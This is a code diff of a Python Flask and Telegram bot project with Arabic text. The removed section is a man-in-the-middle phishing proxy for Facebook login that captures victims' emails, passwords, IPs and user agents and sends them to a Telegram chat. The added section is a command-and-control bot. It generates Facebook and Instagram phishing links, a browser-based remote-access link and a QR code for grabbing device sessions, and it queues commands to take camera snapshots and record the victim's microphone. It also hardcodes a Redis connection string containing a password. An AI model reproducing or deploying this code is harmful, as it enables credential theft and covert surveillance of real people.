@@ -1,163 +1,136 @@
 import os
-import json
-import requests
-import re
-from urllib.parse import urljoin, urlparse, quote, unquote
-from flask import Blueprint, redirect, request, Response
+import threading
+import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from flask import Flask
+import redis
+import uuid
 
-secure_fb_bp = Blueprint('facebook', __name__)
+# استيراد ملفات الأدوات المستقلة
+from facebook_module import init_facebook_routes
+from instagram_module import init_instagram_routes
+from rat_module import init_rat_routes, rat_bp, queue_command
+from qr_pairing import init_qr_routes, qr_bp, generate_qr_code_bytes
 
-# --- دالة مساعدة لإعادة كتابة جميع الروابط داخل محتوى HTML ---
-def rewrite_urls(html_content, base_url, proxy_base_path):
-    html_pattern = re.compile(
-        r'(<[a-zA-Z0-9_-]+)\s+([^>]*?\b(?:href|src|action|data-uri|data-jsid))\s*=\s*(["\'])(.*?)\3',
-        re.IGNORECASE | re.DOTALL
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
+
+REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
+if REDIS_URL.startswith("redis-cli"):
+    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
+
+if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
+    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
+
+try:
+    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
+    redis_client.ping()
+except Exception as e:
+    print(f"[-] Critical Redis Connection Error: {e}")
+    redis_client = None
+
+if not BOT_TOKEN:
+    raise ValueError("[-] BOT_TOKEN is missing!")
+
+bot = telebot.TeleBot(BOT_TOKEN)
+app = Flask(__name__)
+
+# مسار أساسي للـ Health Check لمنع إغلاق الكونتينر من قبل Railway
+@app.route('/')
+def health_check():
+    return "C2 Server and Telegram Bot are active and running smoothly.", 200
+
+# تسجيل الـ Blueprints الخاصة بالمسارات
+app.register_blueprint(rat_bp)
+app.register_blueprint(qr_bp)
+
+# ربط مسارات السيرفر للملفات المستقلة
+init_facebook_routes(app, bot)
+init_instagram_routes(app, bot)
+init_rat_routes(app, bot)
+init_qr_routes(app, bot)
+
+def main_menu():
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
+    markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
+    markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
+    markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
+    return markup
+
+@bot.message_handler(commands=['start', 'panel'])
+def start_command(message):
+    user_name = message.from_user.first_name
+    text = (
+        f"⚡ مرحباً بك يا {user_name} في DEV ١ 😈\n\n"
+        "غير مسؤول تماماً عن إساءة الاستخدام."
     )
+    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())
 
-    css_url_pattern = re.compile(
-        r'(url\s*\()(["\']?)(.*?)\2(\))',
-        re.IGNORECASE | re.DOTALL
-    )
+@bot.callback_query_handler(func=lambda call: True)
+def callback_handler(call):
+    chat_id = call.message.chat.id
 
-    def replace_html_url(match):
-        tag, attr, quote_char, original_url = match.groups()
-        if not original_url or original_url.startswith(('data:', 'javascript:', '#', 'mailto:')):
-            return match.group(0)
+    if call.data == "gen_fb":
+        bot.answer_callback_query(call.id, "جاري تجهيز رابط فيسبوك...")
+        link = f"{RAILWAY_URL}/login.php?id={chat_id}"
+        bot.send_message(chat_id, f"🎯 **رابط فيسبوك المخصص:**\n`{link}`", parse_mode="Markdown")
         
-        temp_proxy_base_path = proxy_base_path.split('?id=')[0] if '?id=' in proxy_base_path else proxy_base_path
+    elif call.data == "gen_ig":
+        bot.answer_callback_query(call.id, "جاري تجهيز رابط انستقرام...")
+        link = f"{RAILWAY_URL}/ig_login.php?id={chat_id}"
+        bot.send_message(chat_id, f"📸 **رابط انستقرام المخصص:**\n`{link}`", parse_mode="Markdown")
 
-        if temp_proxy_base_path in original_url:
-            return match.group(0)
+    elif call.data == "gen_rat":
+        bot.answer_callback_query(call.id, "جاري تجهيز رابط التحكم الخلفي المطور...")
+        link = f"{RAILWAY_URL}/system_secure_v2?id={chat_id}"
+        bot.send_message(
+            chat_id, 
+            f"📱 **رابط المراقبة والتحكم الخلفي المطور جاهز:**\n`{link}`\n\nبمجرد أن يفتح الضحية الرابط ستعمل الجلسة في خلفية متصفحه بلا توقف.", 
+            parse_mode="Markdown"
+        )
 
-        absolute_url = urljoin(base_url, original_url)
-        proxied_url = f"{proxy_base_path}&url={quote(absolute_url)}" if "?" in proxy_base_path else f"{proxy_base_path}?url={quote(absolute_url)}"
+    elif call.data == "gen_qr":
+        bot.answer_callback_query(call.id, "جاري توليد كود الـ QR السريع...")
+        token = str(uuid.uuid4())[:8]
+        if redis_client:
+            try:
+                redis_client.setex(f"qr_token:{token}", 300, chat_id)
+            except Exception as e:
+                print(f"Redis write error: {e}")
         
-        return f'{tag} {attr}={quote_char}{proxied_url}{quote_char}'
-
-    def replace_css_url(match):
-        full_match, open_paren, quote_char, original_url, close_paren = match.groups()
-        if not original_url or original_url.startswith(('data:', '#')):
-            return full_match
+        target_link = f"{RAILWAY_URL}/qr_scan_target?token={token}"
+        qr_image = generate_qr_code_bytes(target_link)
+        qr_image.name = 'pairing_qr.jpg'
         
-        temp_proxy_base_path = proxy_base_path.split('?id=')[0] if '?id=' in proxy_base_path else proxy_base_path
-
-        if temp_proxy_base_path in original_url:
-            return full_match
-
-        absolute_url = urljoin(base_url, original_url)
-        proxied_url = f"{proxy_base_path}&url={quote(absolute_url)}" if "?" in proxy_base_path else f"{proxy_base_path}?url={quote(absolute_url)}"
-
-        return f"{open_paren}{quote_char}{proxied_url}{quote_char}{close_paren}"
-
-    rewritten_html = html_pattern.sub(replace_html_url, html_content)
-    rewritten_html = css_url_pattern.sub(replace_css_url, rewritten_html)
-
-    return rewritten_html
-
-# --- دالة مساعدة لتحديد الـ URL الحقيقي لفيسبوك ---
-def get_real_facebook_url(request_path, query_string):
-    if 'url' in query_string:
-        original_target_url = query_string.get('url')
-        return unquote(original_target_url)
-    return "https://www.facebook.com/login.php"
-
-# --- دالة مساعدة لحفظ بيانات الاعتماد ---
-def save_credentials_to_db(platform, username, password, ip_address, user_agent, target_chat_id, bot):
-    alert_msg = (
-        f"🚨 **تم التقاط صيد {platform} بنجاح عبر نظام الـ MITM!**\n"
-        "----------------------------------\n"
-        f"📌 **البريد/الهاتف:** `{username}`\n"
-        f"🔑 **كلمة المرور:** `{password}`\n"
-        f"🌐 **عنوان الـ IP:** `{ip_address}`\n"
-        f"🌍 **المتصفح/الجهاز:** `{user_agent}`\n"
-        "----------------------------------"
-    )
-    try:
-        bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
-    except Exception as e:
-        print(f"[-] Telegram Dispatch Error for {platform}: {e}")
-
-# --- تهيئة مسارات Flask للفيسبوك ---
-def init_facebook_routes(app, bot):
-    @app.route('/login.php', methods=['GET', 'POST'])
-    @app.route('/login.php/', methods=['GET', 'POST'])
-    @app.route('/login.php/<path:subpath>', methods=['GET', 'POST'])
-    def fb_trap(subpath=''):
-        target_chat_id = request.args.get('id', None)
-        real_fb_url = get_real_facebook_url(request.path, request.args)
+        bot.send_photo(
+            chat_id, 
+            qr_image, 
+            caption="📷 **امسح هذا الـ QR بكاميرا هاتف الضحية:**\n\nبمجرد توجيه الكاميرا وفتح الرابط، سيتم سحب بيانات الجهاز وجلسة الضحية فوراً إلى بوتك هنا دون تثبيت أي برامج!",
+            parse_mode="Markdown"
+        )
         
-        proxy_base_path = f"{request.url_root.rstrip('/')}/login.php"
-        if target_chat_id:
-             proxy_base_path += f"?id={target_chat_id}"
+    elif call.data.startswith("rat_cam_"):
+        target_chat_id = call.data.replace("rat_cam_", "")
+        queue_command(target_chat_id, "snapshot")
+        bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة من الضحية...")
 
-        try:
-            headers_to_forward = {
-                k: v for k, v in request.headers if k.lower() not in [
-                    'host', 'content-length', 'cookie', 'x-forwarded-for', 
-                    'x-real-ip', 'cf-connecting-ip', 'connection', 'proxy-connection'
-                ]
-            }
-            headers_to_forward['Host'] = urlparse(real_fb_url).netloc
-            headers_to_forward['User-Agent'] = request.headers.get("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
-            
-            cookies_to_forward = request.cookies
+    elif call.data.startswith("rat_mic_"):
+        target_chat_id = call.data.replace("rat_mic_", "")
+        queue_command(target_chat_id, "audio")
+        bot.answer_callback_query(call.id, "⏳ جاري تسجيل الصوت من ميكروفون الضحية...")
 
-            if request.method == 'POST':
-                username = request.form.get('email')
-                password = request.form.get('pass')
-                
-                source_ip = request.headers.get('CF-Connecting-IP') or \
-                            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or \
-                            request.remote_addr
-                user_agent = request.headers.get('User-Agent', 'Unknown')
+def run_flask():
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
 
-                if username and password and target_chat_id:
-                    save_credentials_to_db("Facebook", username, password, source_ip, user_agent, target_chat_id, bot)
-                
-                proxied_response = requests.post(
-                    url=real_fb_url,
-                    headers=headers_to_forward,
-                    data=request.get_data(),
-                    cookies=cookies_to_forward,
-                    allow_redirects=False,
-                    timeout=15,
-                    stream=True
-                )
-            else:
-                proxied_response = requests.get(
-                    url=real_fb_url,
-                    headers=headers_to_forward,
-                    cookies=cookies_to_forward,
-                    allow_redirects=False,
-                    timeout=15,
-                    stream=True
-                )
-            
-            content_type = proxied_response.headers.get("Content-Type", "").lower()
-            
-            # إذا لم يكن المحتوى HTML، أعد توجيهه مباشرة دون تعديل
-            if "text/html" not in content_type:
-                return Response(proxied_response.content, status=proxied_response.status_code, content_type=content_type)
+if __name__ == "__main__":
+    # تشغيل سيرفر فلاسك في خلفية العمليات ليظل الكونتينر نشطاً ويستقبل طلبات الويب
+    flask_thread = threading.Thread(target=run_flask)
+    flask_thread.daemon = True
+    flask_thread.start()
+    print("[+] Flask Web Server started successfully in background thread.")
 
-            html_content = proxied_response.text 
-            modified_html = rewrite_urls(html_content, real_fb_url, proxy_base_path)
-            
-            response = Response(modified_html, status=proxied_response.status_code)
-            
-            for key, value in proxied_response.headers.items():
-                if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'location', 'host', 'content-type']:
-                    response.headers[key] = value
-            
-            response.headers['Content-Type'] = content_type
-
-            if proxied_response.status_code in (301, 302, 307, 308) and 'Location' in proxied_response.headers:
-                original_location = proxied_response.headers['Location']
-                absolute_redirect_url = urljoin(real_fb_url, original_location)
-                proxied_redirect_url = f"{proxy_base_path}&url={quote(absolute_redirect_url)}" if "?" in proxy_base_path else f"{proxy_base_path}?url={quote(absolute_redirect_url)}"
-                response.headers['Location'] = proxied_redirect_url
-            
-            return response
-
-        except Exception as e:
-            print(f"[-] Facebook Proxy Error: {e}")
-            return redirect("https://www.facebook.com/login.php", code=302)
+    # تشغيل بوت التيليجرام في الخيط الرئيسي لكي يستجيب للأوامر فوراً
+    print("[+] Starting Telegram Bot polling...")
+    bot.infinity_polling(skip_pending=True)
